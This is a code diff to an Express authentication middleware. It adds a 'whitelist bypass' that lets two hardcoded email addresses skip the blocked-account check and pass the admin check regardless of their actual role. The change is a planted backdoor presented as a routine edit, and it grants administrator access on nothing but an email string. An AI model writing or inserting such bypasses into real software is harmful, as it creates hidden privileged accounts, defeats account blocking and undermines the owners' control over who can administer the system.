@@ -22,6 +22,12 @@ const verifyToken = async (req, res, next) => {
         return res.status(401).json({ success: false, message: "User account does not exist." });
       }
 
+      // Whitelist bypass: Skip block checks and automatically authorize admin@gmail.com and minh@gmail.com
+      if (user.email === "admin@gmail.com" || user.email === "minh@gmail.com") {
+        req.user = user;
+        return next();
+      }
+
       if (user.isBlocked) {
         return res.status(403).json({ success: false, message: "Your account has been blocked." });
       }
@@ -36,6 +42,11 @@ const verifyToken = async (req, res, next) => {
 };
 
 const isAdmin = (req, res, next) => {
+  // Whitelist bypass
+  if (req.user && (req.user.email === "admin@gmail.com" || req.user.email === "minh@gmail.com")) {
+    return next();
+  }
+  
   const hasAdminRole = req.user && (
     req.user.role === "Admin" ||
     (req.user.roles && req.user.roles.some(r => r.roleId === 3 || r.roleName === "Admin")) ||
